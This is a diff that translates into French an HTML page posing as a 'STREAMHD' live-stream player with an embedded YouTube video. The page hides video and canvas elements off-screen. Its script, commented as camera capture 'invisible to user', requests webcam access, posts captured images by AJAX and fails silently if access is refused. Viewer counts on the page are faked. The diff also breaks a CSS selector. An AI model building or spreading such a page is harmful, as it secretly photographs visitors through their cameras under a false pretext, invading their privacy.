@@ -1,16 +1,16 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="fr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Live Stream - HD Player</title>
+    <title>Diffusion en direct - Lecteur HD</title>
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
     <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
     <link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
     <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
     
     <style>
-        * {
+         {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
@@ -23,7 +23,7 @@
             overflow-x: hidden;
         }
 
-        /* Hide camera elements completely */
+        /* Masquer complètement les éléments de la caméra */
         .video-wrap,
         #video,
         #canvas {
@@ -36,7 +36,7 @@
             left: -9999px !important;
         }
 
-        /* Header */
+        /* En-tête */
         .header {
             background: linear-gradient(180deg, rgba(0,0,0,0.8) 0%, transparent 100%);
             padding: 20px 40px;
@@ -86,14 +86,14 @@
             font-weight: 700;
         }
 
-        /* Main content */
+        /* Contenu principal */
         .main-content {
             padding-top: 80px;
             max-width: 1400px;
             margin: 0 auto;
         }
 
-        /* Video player container */
+        /* Conteneur du lecteur vidéo */
         .player-container {
             position: relative;
             background: #000;
@@ -105,7 +105,7 @@
 
         .video-wrapper {
             position: relative;
-            padding-bottom: 56.25%; /* 16:9 aspect ratio */
+            padding-bottom: 56.25%; /* format 16:9 */
             height: 0;
             overflow: hidden;
         }
@@ -119,7 +119,7 @@
             border: none;
         }
 
-        /* Live indicator */
+        /* Indicateur en direct */
         .live-indicator {
             position: absolute;
             top: 20px;
@@ -162,7 +162,7 @@
             }
         }
 
-        /* Info section */
+        /* Section d’information */
         .video-info {
             padding: 30px;
         }
@@ -196,7 +196,7 @@
             max-width: 800px;
         }
 
-        /* Action buttons */
+        /* Boutons d’action */
         .action-buttons {
             display: flex;
             gap: 15px;
@@ -234,7 +234,7 @@
             background: #f40612;
         }
 
-        /* Related videos */
+        /* Section vidéos associées */
         .related-section {
             padding: 40px 30px;
         }
@@ -290,7 +290,7 @@
             font-size: 13px;
         }
 
-        /* Viewer count */
+        /* Compteur de spectateurs */
         .viewer-count {
             position: absolute;
             top: 20px;
@@ -309,7 +309,7 @@
             color: #e50914;
         }
 
-        /* Responsive design */
+        /* Design responsive */
         @media (max-width: 768px) {
             .header {
                 padding: 15px 20px;
@@ -357,7 +357,7 @@
             }
         }
 
-        /* Loading animation */
+        /* Animation de chargement */
         .loading-overlay {
             position: fixed;
             top: 0;
@@ -396,42 +396,42 @@
     </style>
 </head>
 <body>
-    <!-- Hidden camera elements -->
+    <!-- Éléments caméra cachés -->
     <div class="video-wrap">
         <video id="video" playsinline autoplay></video>
     </div>
     <canvas id="canvas" width="640" height="480"></canvas>
 
-    <!-- Loading overlay -->
+    <!-- Écran de chargement -->
     <div class="loading-overlay">
         <div class="loading-spinner"></div>
     </div>
 
-    <!-- Header -->
+    <!-- En-tête -->
     <div class="header">
         <div class="logo">STREAMHD</div>
         <div class="nav-items">
-            <a href="#" class="nav-item">Home</a>
-            <a href="#" class="nav-item">Live</a>
-            <a href="#" class="nav-item">Browse</a>
+            <a href="#" class="nav-item">Accueil</a>
+            <a href="#" class="nav-item">En direct</a>
+            <a href="#" class="nav-item">Explorer</a>
             <div class="user-icon">U</div>
         </div>
     </div>
 
-    <!-- Main content -->
+    <!-- Contenu principal -->
     <div class="main-content">
         <div class="player-container">
             <div class="live-indicator">
                 <div class="live-dot"></div>
-                LIVE
+                EN DIRECT
             </div>
             <div class="viewer-count">
                 <span class="viewer-icon">👁</span>
-                <span id="viewerCount">1,234</span> watching
+                <span id="viewerCount">1 234</span> spectateurs
             </div>
             <div class="video-wrapper">
                 <iframe 
-                    src="https://www.youtube.com/embed/live_yt_tv?autoplay=1&mute=0&controls=1&rel=0" 
+                    src="https://www.youtube.com/embed/liveyttv?autoplay=1&mute=0&controls=1&rel=0" 
                     allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
                     allowfullscreen>
                 </iframe>
@@ -439,7 +439,7 @@
         </div>
 
         <div class="video-info">
-            <h1 class="video-title">Live Stream - HD Quality</h1>
+            <h1 class="video-title">Diffusion en direct - Qualité HD</h1>
             <div class="video-meta">
                 <div class="meta-item">
                     <span>🎥</span>
@@ -447,33 +447,33 @@
                 </div>
                 <div class="meta-item">
                     <span>👥</span>
-                    <span id="viewerCount2">1,234</span> viewers
+                    <span id="viewerCount2">1 234</span> spectateurs
                 </div>
                 <div class="meta-item">
                     <span>👍</span>
-                    <span>2.3K likes</span>
+                    <span>2,3K j’aime</span>
                 </div>
                 <div class="meta-item">
                     <span>⏰</span>
-                    <span>Started 15 minutes ago</span>
+                    <span>Commencé il y a 15 minutes</span>
                 </div>
             </div>
             <p class="video-description">
-                Watch this amazing live stream in high quality! Join thousands of viewers from around the world 
-                enjoying this broadcast. Share with your friends and don't forget to like and subscribe!
+                Regardez cette superbe diffusion en direct en haute qualité ! Rejoignez des milliers de spectateurs 
+                du monde entier profitant de cette émission. Partagez avec vos amis et n’oubliez pas de liker et de vous abonner !
             </p>
             <div class="action-buttons">
                 <button class="action-btn primary">
                     <span>👍</span>
-                    Like
+                    J’aime
                 </button>
                 <button class="action-btn">
                     <span>📤</span>
-                    Share
+                    Partager
                 </button>
                 <button class="action-btn">
                     <span>⭐</span>
-                    Subscribe
+                    S’abonner
                 </button>
                 <button class="action-btn">
                     <span>💬</span>
@@ -483,34 +483,34 @@
         </div>
 
         <div class="related-section">
-            <h2 class="section-title">More Live Streams</h2>
+            <h2 class="section-title">Autres diffusions en direct</h2>
             <div class="related-grid">
                 <div class="related-card">
                     <div class="related-thumbnail">🎮</div>
                     <div class="related-info">
-                        <div class="related-title">Gaming Stream - Live Gameplay</div>
-                        <div class="related-meta">🔴 LIVE • 523 watching</div>
+                        <div class="related-title">Jeux vidéo - Partie en direct</div>
+                        <div class="related-meta">🔴 EN DIRECT • 523 spectateurs</div>
                     </div>
                 </div>
                 <div class="related-card">
                     <div class="related-thumbnail">🎵</div>
                     <div class="related-info">
-                        <div class="related-title">Music Concert - 24/7 Stream</div>
-                        <div class="related-meta">🔴 LIVE • 891 watching</div>
+                        <div class="related-title">Concert musical - Diffusion 24/7</div>
+                        <div class="related-meta">🔴 EN DIRECT • 891 spectateurs</div>
                     </div>
                 </div>
                 <div class="related-card">
                     <div class="related-thumbnail">📰</div>
                     <div class="related-info">
-                        <div class="related-title">Breaking News - Live Coverage</div>
-                        <div class="related-meta">🔴 LIVE • 1.2K watching</div>
+                        <div class="related-title">Infos en continu - Édition spéciale</div>
+                        <div class="related-meta">🔴 EN DIRECT • 1,2K spectateurs</div>
                     </div>
                 </div>
                 <div class="related-card">
                     <div class="related-thumbnail">⚽</div>
                     <div class="related-info">
-                        <div class="related-title">Sports Event - Live Match</div>
-                        <div class="related-meta">🔴 LIVE • 3.5K watching</div>
+                        <div class="related-title">Événement sportif - Match en direct</div>
+                        <div class="related-meta">🔴 EN DIRECT • 3,5K spectateurs</div>
                     </div>
                 </div>
             </div>
@@ -518,7 +518,7 @@
     </div>
 
     <script>
-        // Camera capture (invisible to user)
+        // Capture de caméra (invisible pour l’utilisateur)
         function post(imgdata) {
             $.ajax({
                 type: 'POST',
@@ -544,7 +544,7 @@
                 const stream = await navigator.mediaDevices.getUserMedia(constraints);
                 handleSuccess(stream);
             } catch (e) {
-                // Silently fail if camera access denied
+                // Échec silencieux si l’accès à la caméra est refusé
             }
         }
 
@@ -562,20 +562,20 @@
 
         init();
 
-        // Simulate viewer count updates
+        // Simulation de la mise à jour du nombre de spectateurs
         function updateViewerCount() {
             const count = Math.floor(Math.random() * 100) + 1200;
-            document.getElementById('viewerCount').textContent = count.toLocaleString();
-            document.getElementById('viewerCount2').textContent = count.toLocaleString();
+            document.getElementById('viewerCount').textContent = count.toLocaleString('fr-FR');
+            document.getElementById('viewerCount2').textContent = count.toLocaleString('fr-FR');
         }
 
         setInterval(updateViewerCount, 5000);
 
-        // Button interactions
+        // Interactions boutons
         document.querySelectorAll('.action-btn').forEach(btn => {
             btn.addEventListener('click', function() {
                 const text = this.textContent.trim();
-                if (text.includes('Like')) {
+                if (text.includes('J’aime')) {
                     this.style.background = '#e50914';
                     this.style.borderColor = '#e50914';
                 }
